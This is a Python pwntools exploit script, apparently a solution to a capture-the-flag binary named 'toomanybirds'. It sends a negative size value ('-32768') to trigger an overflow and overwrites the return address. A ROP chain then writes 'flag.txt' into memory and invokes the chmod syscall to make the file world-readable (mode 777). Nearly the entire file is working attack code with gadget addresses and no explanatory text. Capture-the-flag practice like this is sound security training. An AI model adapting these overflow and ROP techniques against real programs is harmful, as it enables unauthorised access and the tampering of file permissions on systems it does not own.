#!/usr/bin/env python3

from pwn import *
import time

context(arch='amd64',os='linux')
context.terminal = ["tmux","splitw","-h"]

DEBUG = False

if DEBUG:
    binary= './toomanybirds_copy'
else:
    binary = './toomanybirds'

# readable writable region
data_addr = 0x4ca000
ropp = b''

# pop rdi; ret
ropp += p64(0x40186a)
ropp += b'flag.txt'

# pop rax; ret
ropp += p64(0x44e580)
ropp += p64(data_addr)

# mov qword ptr [rax], rdi; pop rbx; ret
ropp += p64(0x48fe84)
ropp += p64(0xcafecafe)

########### chmod  ##############
# pop rax; ret
ropp += p64(0x44e580)
ropp += p64(90)

# pop rdi; ret
ropp += p64(0x40186a)
ropp += p64(data_addr)

# pop rsi; ret
ropp += p64(0x405f97)
ropp += p64(0o777)
# ropp += p64(0o400)

# syscall; ret
ropp += p64(0x41cb14)


io = process(binary)
io.readuntil(b'> ')

io.send(b'-32768')

offset = 512
payload = ropp.ljust(offset, b'a')

payload += p64(0x40332a)
payload_len = len(payload)
payload += b'a'* (0x8000 - payload_len)



gdb_commands='''
source /usr/local/share/gef/gef.py
b *askforbirds+174
c
'''

# print(payload)
if DEBUG:
    gdb.attach(io,gdb_commands)

io.sendline(payload)

sleep(1)

try:
    with open("flag.txt", 'r') as file:
        print(file.read())
except:
    print("Error while reading the file")
